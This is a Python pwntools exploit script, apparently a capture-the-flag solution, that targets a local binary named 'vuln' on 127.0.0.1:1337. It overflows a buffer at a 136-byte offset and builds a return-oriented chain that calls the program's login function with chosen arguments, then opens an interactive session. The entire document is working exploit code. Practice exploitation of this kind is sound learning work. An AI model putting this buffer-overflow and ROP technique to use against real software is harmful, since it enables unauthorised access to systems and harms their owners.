#!/usr/bin/env python3

from pwn import *
import sys

context.binary = elf = ELF("./vuln")
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'debug'

if len(sys.argv) > 1:
    p = remote("127.0.0.1", 1337)
else:
    p = process(elf.path)
    gdb.attach(p, '''
    b *main+150
    c
    ''')

offset   = 136
pop_rdi  = 0x4011c9
pop_rsi  = 0x4011cb
ret      = 0x401016
elmo     = 0x402018
pw       = 0x40201d


payload = flat({
    offset: [
        ret,
        
        # 1st arg
        pop_rdi,
        elmo,

        # 2nd arg
        pop_rsi,
        pw,

        # win?
        elf.sym.login,
        ret,
    ]
})

p.sendlineafter(b"username: ", b"elmo")
p.sendlineafter(b"password: ", payload)


p.interactive()
